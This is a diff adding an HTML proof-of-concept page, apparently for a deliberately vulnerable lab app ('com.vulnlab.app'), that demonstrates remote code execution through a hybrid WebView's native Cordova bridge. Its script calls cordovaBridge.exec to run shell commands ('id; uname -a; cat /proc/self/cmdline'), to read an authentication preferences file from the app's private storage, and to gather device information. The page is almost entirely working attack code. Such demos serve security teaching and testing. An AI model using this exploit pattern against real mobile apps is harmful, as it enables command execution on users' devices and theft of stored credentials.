@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Cordova Bridge Demo</title>
+<style>
+  body { font-family: -apple-system, sans-serif; padding: 16px; }
+  pre  { background: #f0f0f0; padding: 8px; overflow: auto; white-space: pre-wrap; }
+  button { display:block; width: 100%; padding: 12px; margin: 6px 0; }
+</style>
+</head>
+<body>
+
+<h2>Cordova Bridge — RCE Demo</h2>
+<p>This page demonstrates how any JavaScript loaded into the hybrid WebView
+can call native plugin handlers exposed via <code>cordovaBridge.exec()</code>.</p>
+
+<button onclick="callExec()">cordovaBridge.exec('System','exec','id')</button>
+<button onclick="readFile()">FilePlugin.readFile('/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml')</button>
+<button onclick="getDeviceInfo()">Device.getInfo()</button>
+
+<pre id="out">Tap a button.</pre>
+
+<script>
+  function show(label, val) {
+    document.getElementById('out').textContent =
+      label + '\n--------------------\n' + val;
+  }
+
+  function callExec() {
+    var r = cordovaBridge.exec('System', 'exec', 'id; uname -a; cat /proc/self/cmdline');
+    show('System.exec', r);
+  }
+
+  function readFile() {
+    var path = '/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml';
+    var r = cordovaBridge.exec('FilePlugin', 'readFile', path);
+    show('FilePlugin.readFile ' + path, r);
+  }
+
+  function getDeviceInfo() {
+    var r = cordovaBridge.exec('Device', 'getInfo', '');
+    show('Device.getInfo', r);
+  }
+</script>
+
+</body>
+</html>
